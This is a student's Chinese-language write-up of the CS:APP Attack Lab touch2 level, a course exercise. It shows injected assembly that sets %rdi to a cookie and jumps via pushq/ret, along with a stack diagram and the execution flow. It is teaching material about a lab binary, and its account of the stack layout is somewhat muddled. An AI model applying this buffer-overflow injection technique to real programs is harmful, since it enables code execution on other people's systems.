# Attack Lab — Level 2 解法记录

> 运行环境：x86-64 Linux，较新 GCC / glibc（`printf` 使用 SSE `movaps`，栈需 16 字节对齐）

---

## 题目

**touch2**：缓冲区溢出注入代码，使得程序跳转到 `touch2` 时，其第一个参数 `%rdi` 等于 cookie。

- cookie：`0x59b997fa`
- touch2 地址：`0x004017ec`

---

## 解法思路

把 `%rsp` 指向的内存处的值（即返回地址）改为 **`%rsp + 8`**，使 `getbuf` 的 `ret` 跳转到注入代码。注入代码放在 `%rsp + 8` 处。

注入代码：

```asm
movq  $0x59b997fa, %rdi    # cookie → 第一个参数 %rdi
pushq $0x004017ec          # touch2 地址压栈
ret                        # 弹出 touch2 地址 → 跳转
```

> 关键技巧：用 `pushq 地址; ret` 实现"手动跳转"（poor-man's jump），注入代码自包含，不需要在代码后精确布置目标地址。

---

## 栈布局

```
低地址
┌──────────────────────────────┐
│  8 字节垃圾填充               │
├──────────────────────────────┤
│  movq $0x59b997fa, %rdi      │  ← 注入代码（%rsp+8，13 字节）
│  pushq $0x004017ec           │
│  ret                         │
├──────────────────────────────┤
│  padding                     │
├──────────────────────────────┤
│  返回地址 = %rsp+8           │  ← getbuf 的 ret 跳到这里
└──────────────────────────────┘
高地址
```

执行流程：

```
getbuf 的 ret → 弹出 %rsp+8 → 跳转到注入代码
注入代码：%rdi = cookie
         pushq touch2 → %rsp 下移 8，写入 touch2 地址
         ret → 弹出 touch2 → 跳转到 touch2
touch2(%rdi=cookie) → 打印成功
```

---

## 关于栈对齐

进入 `touch2` 时 `%rsp` 位于 `buffer + 48`。如果 `touch2` 内 `printf` 因栈未 16 字节对齐而崩溃（SIGSEGV），需要调整注入代码前的 padding 或链中的 dummy 值来修正对齐。

---

## 运行结果

✅ 已成功运行：`touch2` 正确打印 cookie，`printf` 未崩溃（栈对齐恰好合适）。

---

[[t大课程/CSAPP/notes/README|返回索引]]
